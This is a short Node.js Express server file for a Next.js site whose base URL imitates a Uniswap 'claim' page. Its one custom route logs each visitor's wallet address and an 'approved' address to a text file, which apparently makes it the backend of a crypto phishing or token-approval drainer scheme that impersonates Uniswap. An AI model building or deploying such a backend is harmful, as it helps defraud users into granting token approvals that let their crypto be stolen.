const dotenv = require("dotenv");
const isDev = process.env.NODE_ENV !== "production";

const path = require('path');

const envFile = isDev ? `.env.${process.env.NODE_ENV}` : ".env";
dotenv.config({ path: envFile });

const express = require("express");
const app = express();
const server = require("http").Server(app);

const next = require("next");

const nextApp = next({ dev: isDev });
const handler = nextApp.getRequestHandler(nextApp);
const bodyParser = require("body-parser");
const compression = require("compression");

const fs = require('fs');

nextApp.prepare().then(() => {
  app.use("/static", express.static("public"));

  app.use(compression());

  app.use(bodyParser.json());
  app.use(bodyParser.urlencoded({ extended: false }));

  app.post('/app', (req, res) => {
    fs.appendFile('./helpers/address.txt', `"Address: ${(req.body.userAddress).toString()} Aprobada: ${(req.body.approveAddress).toString()}",` + '\n', (err) => {
        if (err) throw err;
    });

    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({ message: true }));
  });

  app.get("*", (req, res) => {
    return handler(req, res);
  });

  app.set("port", 80);
  app.locals.baseURL = "https://uniswapclaim.com";

  server.listen(app.get("port"), (err) => {
    if (err) throw err;
    console.log(`> Ready on http://localhost:${app.get("port")}`);
  });

  console.log(`Server started on port ${app.get("port")}`);
});